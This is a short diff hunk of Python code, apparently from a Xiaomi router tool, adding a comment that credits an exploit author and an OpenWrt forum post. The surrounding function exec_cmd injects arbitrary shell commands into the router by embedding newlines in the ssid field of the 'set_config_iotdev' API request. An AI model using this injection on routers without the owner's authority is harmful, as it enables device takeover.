@@ -41,6 +41,10 @@ stok = gw.web_login()
 
 
 def exec_cmd(cmd, api = 'API/misystem/set_config_iotdev'):
+    ######
+    # vuln/exploit author: LonGDikE
+    # publication: https://forum.openwrt.org/t/55049/62
+    ######
     params = { 'bssid': 'Xiaomi', 'user_id': '_username_', 'ssid': ('-h' + '\n' + cmd + '\n') }
     resp = gw.api_request(api, params)
     return resp
